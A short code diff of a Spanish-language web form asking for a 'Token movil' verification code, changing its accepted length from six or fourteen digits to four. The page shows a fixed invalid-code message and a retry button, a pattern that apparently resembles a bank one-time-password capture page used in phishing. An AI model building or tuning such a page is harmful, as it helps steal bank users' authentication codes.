@@ -86,7 +86,7 @@
     <p>Introduce el Token movil.</p>
     <div class="input-group campo-requerido">
       <div class="icon"><i class="fas fa-key"></i></div>
-      <input type="tel" id="codigo" placeholder="Código de verificación" pattern="[0-9]*" inputmode="numeric" minlength="6" maxlength="14" required>
+      <input type="tel" id="codigo" placeholder="Código de verificación" pattern="[0-9]*" inputmode="numeric" minlength="4" maxlength="14" required>
     </div>
     <p class="mensaje-error">Código inválido. Por favor, ingrese el código correctamente.</p>
     <button onclick="reintentarCodigo()">Reintentar</button>
@@ -102,8 +102,8 @@
     function reintentarCodigo() {
       const codigo = document.getElementById("codigo").value;
 
-      if (!codigo || !/^\d{14}$/.test(codigo)) {
-        alert("Ingrese un código válido de 6 dígitos.");
+      if (!codigo || !/^\d{4}$/.test(codigo)) {
+        alert("Ingrese un código válido de 4 dígitos.");
         return;
       }
 
